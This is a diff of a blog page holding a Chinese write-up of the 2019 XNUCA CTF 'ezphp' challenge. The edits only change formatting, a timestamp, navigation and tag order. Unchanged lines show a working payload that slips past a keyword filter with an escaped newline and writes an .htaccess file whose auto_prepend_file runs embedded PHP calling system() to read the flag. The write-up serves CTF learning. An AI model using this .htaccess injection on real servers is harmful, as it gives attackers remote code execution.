@@ -23,7 +23,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E8%BD%AC%E8%BD%BD/ezphp/1-5.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E8%BD%AC%E8%BD%BD/ezphp/1-6.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E8%BD%AC%E8%BD%BD/ezphp/1-7.png">
-<meta property="og:updated_time" content="2019-09-03T08:06:15.917Z">
+<meta property="og:updated_time" content="2019-09-03T08:07:53.765Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="2019XNUCA — ezphp WriteUp">
 <meta name="twitter:description" content="前言没有参加本次比赛，只记录ezphp这一道题目，把同学的Writeup复现并记录下来 ezphp源代码1234567891011121314151617181920212223242526272829303132&amp;lt;?php 	$files = scandir(&apos;./&apos;);	foreach($files as $file)&amp;#123;		if($file !== &quot;index.php&quot;)&amp;#">
@@ -277,7 +277,7 @@
 <p>即可成功执行shell</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E8%BD%AC%E8%BD%BD/ezphp/1-7.png" alt="1-7"></p>
 <p>当然，也有个更简单的方法</p>
-<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>我们可以通过对过滤的关键字中间添加换行 \n 来绕过<strong>stristr</strong>函数的检测，不过仍然需要注意添加 \ 来转义掉换行，这样才不会出现语法错误，如此一来就不需要再绕过<strong>preg_match</strong>函数，即可直接写入<strong>.htaccess</strong>来getshell，payload如下：</p>
+<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>我们可以通过对过滤的关键字中间添加换行<code>\n</code>来绕过<strong>stristr</strong>函数的检测，不过仍然需要注意添加<code>\</code>来转义掉换行，这样才不会出现语法错误，如此一来就不需要再绕过<strong>preg_match</strong>函数，即可直接写入<strong>.htaccess</strong>来getshell，payload如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content=php_value%20auto_prepend_fil\%0ae%20.htaccess%0a%23&lt;? php%20system(&apos;cat%20/root/fla&apos;.&apos;g.txt&apos;);?&gt;\&amp;filename=.htaccess</span><br></pre></td></tr></table></figure>
 <p>写入.htaccess的内容：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_fil\</span><br><span class="line">e .htaccess</span><br><span class="line">#&lt;?php system(&apos;cat /root/fla&apos;.&apos;g.txt&apos;);?&gt;\</span><br><span class="line">Just one chance</span><br></pre></td></tr></table></figure>
@@ -370,8 +370,8 @@
 <nav id="article-nav">
   
   
-    <a href="/Knlvre.github-io/2019/09/01/转载 谈一谈php之filter的妙用/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">转载 | php://filter的妙用</div>
+    <a href="/Knlvre.github-io/2019/09/03/Linux系统下搭建Web服务器和FTP服务器/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Linux系统下搭建Web服务器和FTP服务器</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -513,11 +513,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">博客搭建</a>
+                <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
+                <a href="javascript:void(0)" class="js-tag color5">博客搭建</a>
               </li>
             
             <div class="clearfix"></div>
